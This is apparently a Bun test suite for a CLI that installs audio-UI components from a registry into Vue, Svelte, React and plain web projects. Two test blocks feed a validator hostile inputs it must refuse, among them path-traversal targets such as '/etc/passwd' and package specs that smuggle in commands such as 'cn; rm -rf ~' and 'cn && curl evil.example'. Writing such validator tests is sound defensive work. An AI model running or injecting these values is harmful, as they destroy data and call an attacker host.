import { afterEach, describe, expect, test } from "bun:test";
import {
  existsSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  rmSync,
  writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join, resolve } from "node:path";
import {
  add,
  importedPackages,
  isPackageSpec,
  packageName,
} from "../src/add.ts";
import { indexSheet } from "../src/css.ts";
import { targetPath, UTILS } from "../src/files.ts";
import { detectAlias, parseLooseJson, readConfig } from "../src/project.ts";

/** The registry as the site serves it, from its build in the repo. */
const REGISTRY = resolve(import.meta.dir, "../../../apps/www/public");

const projects: string[] = [];
afterEach(() => {
  for (const folder of projects.splice(0)) {
    rmSync(folder, { force: true, recursive: true });
  }
});

/** A project of a few files, in a folder of its own. */
function project(files: Record<string, unknown>) {
  const cwd = mkdtempSync(join(tmpdir(), "audio-ui-cli-"));
  projects.push(cwd);
  for (const [path, content] of Object.entries(files)) {
    const file = join(cwd, path);
    mkdirSync(dirname(file), { recursive: true });
    writeFileSync(
      file,
      typeof content === "string" ? content : JSON.stringify(content)
    );
  }
  return cwd;
}

const read = (cwd: string, path: string) =>
  readFileSync(join(cwd, path), "utf8");

const run = (cwd: string, names: string[], options = {}) =>
  add({ cwd, install: false, names, registry: REGISTRY, ...options });

const VUE = {
  "package.json": { dependencies: { vue: "^3.5.0" } },
  "src/main.ts": "",
  "tsconfig.app.json": `{
    // create-vue's paths
    "compilerOptions": { "paths": { "@/*": ["./src/*"], }, },
  }`,
};

describe("in Vue", () => {
  test("a knob comes styled, with its adapter, its primitive and its sheet", async () => {
    const cwd = project(VUE);
    const result = await run(cwd, ["knob"]);
    expect(result.items).toEqual(["knob-vue", "knob-element-vue"]);
    for (const file of [
      "src/components/audio-ui/primitive.ts",
      "src/components/audio-ui/knob/knob.ts",
      "src/components/audio-ui/knob/vue.ts",
      "src/components/audio-ui/knob/Knob.vue",
    ]) {
      expect(existsSync(join(cwd, file))).toBe(true);
    }
    expect(read(cwd, "src/components/audio-ui/knob/Knob.vue")).toContain(
      'from "@/components/audio-ui/knob/vue"'
    );
    expect(result.index).toBe("src/components/audio-ui/css/index.css");
    const index = read(cwd, "src/components/audio-ui/css/index.css");
    expect(index).toContain('@import "./theme.css";');
    expect(index).toContain('@import "./knob.css";');
    expect(read(cwd, "src/components/audio-ui/css/knob.css")).toBe(
      read(REGISTRY, "css/nova/knob.css")
    );
  });

  test("the kernel's packages are pinned, and what the project has is left out", async () => {
    const cwd = project(VUE);
    const result = await run(cwd, ["knob"]);
    expect(result.packages).toContain("@ui-sdk/core@0.1.0-beta.14");
    expect(result.packages).toContain("@ui-sdk/vue@0.1.0-beta.14");
    expect(result.packages.map(packageName)).not.toContain("vue");
    expect(result.installCommand).toStartWith("npm install ");
  });

  test("the project's alias replaces @/ in the imports", async () => {
    const cwd = project({
      ...VUE,
      "tsconfig.app.json": {
        compilerOptions: { paths: { "~/*": ["./src/*"] } },
      },
    });
    const result = await run(cwd, ["fader"]);
    expect(result.config.alias).toBe("~");
    expect(read(cwd, "src/components/audio-ui/fader/Fader.vue")).toContain(
      'from "~/components/audio-ui/fader/vue"'
    );
  });

  test("the headless primitive comes alone, with no sheet", async () => {
    const cwd = project(VUE);
    const result = await run(cwd, ["knob"], { headless: true });
    expect(result.items).toEqual(["knob-vue"]);
    expect(result.index).toBeUndefined();
    expect(existsSync(join(cwd, "src/components/audio-ui/knob/Knob.vue"))).toBe(
      false
    );
  });

  test("an item written for React is refused", async () => {
    const cwd = project(VUE);
    await expect(run(cwd, ["use-master-bus"])).rejects.toThrow(
      "written for React"
    );
  });

  test("a skin is its sheet, imported last: an element added after it still goes before it", async () => {
    const cwd = project(VUE);
    await run(cwd, ["knob", "skin-neu"]);
    expect(read(cwd, "src/components/audio-ui/css/skin-neu.css")).toBe(
      read(REGISTRY, "css/skins/neu.css")
    );
    await run(cwd, ["fader"]);
    const index = read(cwd, "src/components/audio-ui/css/index.css");
    expect(index.indexOf("fader.css")).toBeLessThan(
      index.indexOf("skin-neu.css")
    );
    expect(index.trimEnd().endsWith('@import "./skin-neu.css";')).toBe(true);
  });

  test("the sheets gather in one index, which keeps what is in it", async () => {
    const cwd = project(VUE);
    await run(cwd, ["knob"]);
    await run(cwd, ["meter", "fader"]);
    const index = read(cwd, "src/components/audio-ui/css/index.css");
    expect(index.match(/@import/g)).toHaveLength(4);
    expect(index.indexOf("theme.css")).toBeLessThan(index.indexOf("knob.css"));
  });
});

describe("in Svelte", () => {
  test("a knob lands in src/lib, imported through $lib", async () => {
    const cwd = project({
      "package.json": {
        devDependencies: { "@sveltejs/kit": "^2", svelte: "^5" },
      },
      "src/app.html": "",
    });
    const result = await run(cwd, ["knob"]);
    expect(result.config.framework).toBe("svelte");
    const component = read(cwd, "src/lib/components/audio-ui/knob/Knob.svelte");
    expect(component).toContain('from "$lib/components/audio-ui/knob/svelte"');
    expect(
      existsSync(join(cwd, "src/lib/components/audio-ui/knob/svelte/index.ts"))
    ).toBe(true);
    expect(result.index).toBe("src/lib/components/audio-ui/css/index.css");
  });
});

describe("a project with no alias", () => {
  test("Svelte without SvelteKit imports by relative paths, as it has no $lib", async () => {
    const cwd = project({
      "package.json": { devDependencies: { svelte: "^5", vite: "^7" } },
      "src/main.ts": "",
    });
    const result = await run(cwd, ["knob"]);
    expect(result.config.alias).toBeUndefined();
    expect(read(cwd, "src/lib/components/audio-ui/knob/Knob.svelte")).toContain(
      'from "./svelte"'
    );
  });

  test("Vue with no tsconfig paths imports by relative paths", async () => {
    const cwd = project({
      "package.json": { dependencies: { vue: "^3.5.0" } },
      "src/main.ts": "",
    });
    await run(cwd, ["knob"]);
    expect(read(cwd, "src/components/audio-ui/knob/Knob.vue")).toContain(
      'from "./vue"'
    );
  });

  test("React with no alias reaches cn from its folder", async () => {
    const cwd = project({
      "package.json": { dependencies: { react: "^19" } },
      "src/main.tsx": "",
    });
    await run(cwd, ["knob"]);
    const knob = read(cwd, "src/components/audio-ui/knob.tsx");
    expect(knob).toContain('from "../../lib/utils"');
    expect(knob).toContain('from "./knob/react"');
  });
});

describe("in React", () => {
  const REACT = {
    "package.json": { dependencies: { react: "^19", "react-dom": "^19" } },
    "src/main.tsx": "",
    "tsconfig.json": { compilerOptions: { paths: { "@/*": ["./src/*"] } } },
  };

  test("a knob comes styled, with cn from the cn package when the project has none", async () => {
    const cwd = project(REACT);
    const result = await run(cwd, ["knob"]);
    expect(result.items).toEqual(["knob-react", "knob"]);
    expect(existsSync(join(cwd, "src/components/audio-ui/knob.tsx"))).toBe(
      true
    );
    expect(read(cwd, "src/lib/utils.ts")).toBe(UTILS);
    expect(result.packages).toContain("cn");
    expect(result.packages).toContain("class-variance-authority");
    expect(result.index).toBeUndefined();
  });

  test("a project with its own cn keeps it", async () => {
    const cwd = project({
      ...REACT,
      "src/lib/utils.ts": "export const cn = () => '';\n",
    });
    const result = await run(cwd, ["knob"]);
    expect(read(cwd, "src/lib/utils.ts")).toBe("export const cn = () => '';\n");
    expect(result.packages).not.toContain("cn");
  });

  test("a skin is the same sheet as in every framework, with no theme: the element's look is its classes", async () => {
    const cwd = project(REACT);
    const result = await run(cwd, ["knob", "skin-hardware"]);
    expect(result.index).toBe("src/components/audio-ui/css/index.css");
    expect(read(cwd, "src/components/audio-ui/css/skin-hardware.css")).toBe(
      read(REGISTRY, "css/skins/hardware.css")
    );
    const index = read(cwd, "src/components/audio-ui/css/index.css");
    expect(index.match(/@import/g)).toHaveLength(1);
  });

  test("a project with a shadcn theme gets no theme of ours", async () => {
    const cwd = project({ ...REACT, "components.json": {} });
    const result = await run(cwd, ["knob"]);
    expect(result.config.theme).toBe(false);
  });
});

describe("in plain web", () => {
  test("a knob is the custom elements and their sheet", async () => {
    const cwd = project({ "index.html": "", "package.json": {} });
    const result = await run(cwd, ["knob"]);
    expect(result.config.framework).toBe("web");
    expect(result.items).toEqual(["knob-web"]);
    expect(existsSync(join(cwd, "components/audio-ui/knob/web.ts"))).toBe(true);
    expect(result.index).toBe("components/audio-ui/css/index.css");
  });
});

describe("a project's own files", () => {
  test("the same file is left alone, a changed one is kept unless --overwrite", async () => {
    const cwd = project(VUE);
    await run(cwd, ["knob"]);
    const again = await run(cwd, ["knob"]);
    expect(again.files.created).toEqual([]);
    expect(again.files.kept).toEqual([]);

    const path = "src/components/audio-ui/knob/Knob.vue";
    writeFileSync(join(cwd, path), "<template />\n");
    const kept = await run(cwd, ["knob"]);
    expect(kept.files.kept).toEqual([path]);
    expect(read(cwd, path)).toBe("<template />\n");

    const replaced = await run(cwd, ["knob"], { overwrite: true });
    expect(replaced.files.created).toEqual([path]);
  });

  test("the config is kept, and an option given changes it", async () => {
    const cwd = project(VUE);
    await run(cwd, ["knob"]);
    expect(readConfig(cwd)).toMatchObject({ framework: "vue", style: "nova" });
    await run(cwd, ["fader"], { style: "luma" });
    expect(readConfig(cwd)?.style).toBe("luma");
    expect(read(cwd, "src/components/audio-ui/css/fader.css")).toBe(
      read(REGISTRY, "css/luma/fader.css")
    );
  });
});

describe("what the registry may write", () => {
  const config = {
    alias: "@",
    framework: "vue",
    root: "src",
    style: "nova",
    theme: true,
  } as const;
  const cwd = "/project";

  test.each([
    "../outside.ts",
    "components/../../outside.ts",
    "~/../outside.ts",
    "/etc/passwd",
    "C:\\\\Windows\\\\x.ts",
    "%2e%2e/outside.ts",
    "components/\0.ts",
  ])("refuses %p", (target) => {
    expect(() =>
      targetPath({ path: "x.ts", target, type: "registry:ui" }, config, cwd)
    ).toThrow("Refused");
  });

  test("lands a target in the alias's folder, and ~/ from the root", () => {
    const at = (target: string) =>
      targetPath({ path: "x", target, type: "registry:ui" }, config, cwd);
    expect(at("components/audio-ui/knob.tsx")).toBe(
      "/project/src/components/audio-ui/knob.tsx"
    );
    expect(at("~/src/lib/knob.ts")).toBe("/project/src/lib/knob.ts");
  });
});

describe("the packages it installs", () => {
  test.each([
    "cn",
    "class-variance-authority",
    "@ui-sdk/core@0.1.0-beta.14",
    "@scope/name.js@1.2.3",
  ])("passes %p to the package manager", (spec) => {
    expect(isPackageSpec(spec)).toBe(true);
  });

  test.each([
    "--registry=https://evil.example",
    "-g",
    "cn; rm -rf ~",
    "cn && curl evil.example",
    "cn|calc",
    "cn@^1.0.0",
    "cn@>1 <2",
    "../local",
    "git+https://github.com/x/y.git",
    "",
  ])("refuses %p", (spec) => {
    expect(isPackageSpec(spec)).toBe(false);
  });
});

describe("reading a project", () => {
  test("tsconfig with comments and trailing commas", () => {
    expect(
      parseLooseJson(
        '{ "a": "./src/*", // the root\n /* a block */ "b": [1,], }'
      )
    ).toEqual({ a: "./src/*", b: [1] });
  });

  test("the alias that points at the root", () => {
    const cwd = project({
      "tsconfig.json": {
        compilerOptions: { paths: { "#x/*": ["./x/*"], "$/*": ["./src/*"] } },
      },
    });
    expect(detectAlias(cwd, "src")).toBe("$");
    expect(detectAlias(cwd, ".")).toBeUndefined();
  });

  test("the packages a file imports", () => {
    expect([
      ...importedPackages([
        {
          content:
            'import a from "@ui-sdk/vue/primitive";\nimport b from "./parts";\nimport c from "@/lib/utils";\nimport { d } from "class-variance-authority";\nimport "node:fs";\nimport e from "$lib/x";',
        },
      ]),
    ]).toEqual(["@ui-sdk/vue", "class-variance-authority"]);
  });

  test("an index gains the sheets it lacks", () => {
    expect(indexSheet('@import "./theme.css";\n', ["theme", "knob"])).toBe(
      '@import "./theme.css";\n@import "./knob.css";\n'
    );
  });
});
